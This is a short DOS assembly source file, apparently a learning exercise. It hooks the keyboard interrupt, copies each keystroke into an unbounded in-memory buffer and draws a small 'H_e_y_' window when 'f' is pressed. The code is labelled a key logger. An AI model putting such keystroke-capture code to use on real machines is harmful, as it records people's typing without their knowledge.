
locals @@

.186
.model tiny

.code

public 	Logger

extrn DrawWindow: proc

extrn	OldIntAddr
extrn	AsciiBuffer
extrn   BufEnd

;==========================================================================
; Key logger on 9th interrupt
;==========================================================================

Logger		proc

		push 	ax bx cx dx di es ds
		
		pushf
		call 	dword ptr cs:OldIntAddr + 9 * 2		; Old int 09h

		mov 	ah, 11h
		int 	16h
		jz 	@@exit			; check if symbol is ready

		mov 	bx, cs:BufEnd			
		mov 	byte ptr cs:AsciiBuffer[bx], al		; store symbol
		inc 	bx					; in buffer
		mov 	cs:BufEnd, bx				

		cmp 	al, 'f'		;if key is 'f' draw frame
		jne 	@@exit	

		mov 	di, (80 * 4 + 40) * 2
		mov 	cx, 10
		mov 	dx, 5

		call 	DrawWindow

		mov 	di, (80 * 6 + 43) * 2
		mov	cx, 3d 
		mov	si, offset Message
		push 	cs
		pop	ds
		
		rep 	movsw

@@exit:		pop 	ds es di dx cx bx ax

		iret
		endp

; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

Message		db "H_e_y_" 

;==========================================================================

end